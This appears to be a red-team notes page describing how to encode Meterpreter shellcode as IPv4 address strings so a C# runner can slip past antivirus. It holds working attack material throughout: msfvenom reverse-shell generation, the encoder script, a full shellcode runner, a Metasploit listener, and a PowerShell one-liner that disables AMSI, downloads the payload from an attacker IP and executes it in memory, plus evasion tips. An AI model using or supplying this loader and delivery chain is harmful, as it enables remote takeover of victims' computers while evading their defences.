# IPv4 Obfuscation — Shellcode as IP Address Strings

Converts raw shellcode into an array of IPv4 address strings. No byte literals in the binary, no obvious shellcode signatures. The OS-provided `RtlIpv4StringToAddressA` function in `ntdll.dll` reassembles the shellcode at runtime — no custom decoder needed.

**Evasion level:** Bypasses static AV string/byte-pattern signatures. Does NOT bypass behavioral detection once the thread executes.
**Best for:** Antivirus bypass, AMSI bypass when delivered via memory reflection.
**When to use:** Web shell delivery, macro dropper, or when a standard shellcode runner is getting flagged.

---

## Step 1: Generate Raw Shellcode

```bash
# Kali — generate raw Meterpreter binary:
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.211 LPORT=4444 -f raw -o shell.bin

# Or stageless (better for unstable connections):
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.45.211 LPORT=443 -f raw -o shell.bin
```

---

## Step 2: IPv4 Encoder (Python)

Splits the binary into 4-byte chunks, each encoded as an IPv4 address string. Pads with `\x90` (NOP) to reach a multiple of 4 bytes.

```python
import sys

with open("shell.bin", "rb") as f:
    shellcode = f.read()

# Pad to multiple of 4 bytes
padding = 4 - (len(shellcode) % 4)
if padding < 4:
    shellcode += b"\x90" * padding

# Output as C# string array
print('string[] s = {')
for i in range(0, len(shellcode), 4):
    chunk = shellcode[i:i+4]
    print(f'    "{chunk[0]}.{chunk[1]}.{chunk[2]}.{chunk[3]}",')
print('};')
```

**Usage:**
```bash
python3 ipv4_encode.py > ips.cs   # paste the output into the C# template below
```

---

## Step 3: C# IPv4 Shellcode Runner

```csharp
using System;
using System.Runtime.InteropServices;

namespace RevRunner {
    class Program {
        // OS function: parses "A.B.C.D" and writes 4 raw bytes to the address A
        [DllImport("ntdll.dll")]
        static extern int RtlIpv4StringToAddressA(string S, bool Strict, out IntPtr L, IntPtr A);

        [DllImport("kernel32.dll")]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress,
            IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        static void Main(string[] args) {
            // PASTE PYTHON OUTPUT HERE:
            string[] s = {
                "252.72.131.228",
                // ... (rest of output)
            };

            // Allocate RWX memory for reassembled shellcode:
            IntPtr m = VirtualAlloc(IntPtr.Zero, (uint)(s.Length * 4), 0x3000, 0x40);
            IntPtr p = m;

            // Decode: each IP string → 4 raw bytes written to memory:
            foreach (string i in s) {
                IntPtr d;
                RtlIpv4StringToAddressA(i, false, out d, p);
                p = (IntPtr)((long)p + 4);
            }

            // Execute:
            CreateThread(IntPtr.Zero, 0, m, IntPtr.Zero, 0, IntPtr.Zero);
            System.Threading.Thread.Sleep(-1);   // keep process alive
        }
    }
}
```

**Compile — Visual Studio (Windows dev box):**

1. **File → New → Project → Console App (.NET Framework)** (NOT .NET Core)
   - Name: `Revshell`, Framework: **.NET Framework 4.8**
2. Delete defaults, paste in the C# runner above (with your IP array pasted in)
3. **Project → Properties → Build:**
   - Platform target: **x64**
   - Check **"Allow unsafe code"**
4. **Build → Build Solution** (`Ctrl+Shift+B`)
5. Output: `bin\x64\Debug\Revshell.exe`

**Alt (Windows cmd):**
```cmd
csc.exe /unsafe /platform:x64 /out:Revshell.exe Runner.cs
```

---

## Step 4: Start Listener + Web Server

```bash
# Metasploit handler:
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 192.168.45.211; set LPORT 4444; run"

# Serve the compiled EXE:
python3 -m http.server 80
# Place Revshell.exe in ~/Documents/web/ (or wherever the server root is)
```

---

## Step 5: PowerShell In-Memory Delivery (One-Liner)

Patches AMSI, downloads the EXE, and executes it entirely in memory — nothing touches disk.

```powershell
powershell -ep bypass -c "$a=[Ref].Assembly.GetTypes();foreach($t in $a){if($t.Name -like '*iUtils'){$f=$t.GetField('amsiInitFailed','NonPublic,Static');$f.SetValue($null,$true)}}; $bytes=(New-Object System.Net.WebClient).DownloadData('http://192.168.45.211/Revshell.exe'); [System.Reflection.Assembly]::Load($bytes).EntryPoint.Invoke($null,@(,[string[]]@()))"
```

**Update IP** to your Kali IP before running.

---

## How It Works

```
shell.bin (raw bytes)
    ↓ python encoder
["\xfc\x48\x83\xe4" → "252.72.131.228", ...]
    ↓ pasted into C# string array
VirtualAlloc (RWX memory)
    ↓ RtlIpv4StringToAddressA (OS function — no custom decoder)
Raw shellcode reconstructed in memory
    ↓ CreateThread
Meterpreter executes
```

The key insight: `RtlIpv4StringToAddressA` is a legitimate Windows API call. No XOR loop, no custom stub. Static scanners see IP strings; behavioral scanners see a call to a benign OS function.

---

## OPSEC Notes

| Item | Risk |
|------|------|
| `VirtualAlloc(0x40)` — RWX memory | Medium — flagged by some EDRs |
| `CreateThread` direct to shellcode | Medium — call stack is suspicious |
| No strings like "VirtualAlloc" in IAT | Low — strings are hidden in the IP array |
| AMSI patched by PS cradle | Low-Medium — common bypass, well-known |

**To reduce RWX risk:** Allocate RW, write shellcode, then use `VirtualProtect` to mark it RX before creating the thread.

---

## Cross-Reference

- Used as a loader → `03-loaders/` (here)
- Useful for macro dropper payloads → `02-phishing/office-macros/advanced-delivery.md`
- Combine with ETW patching for additional evasion → `01-evasion/etw-bypass/README.md`
- Alternative encoders → `payloads/encoders/shellcode_encoder.py` (XOR/AES)
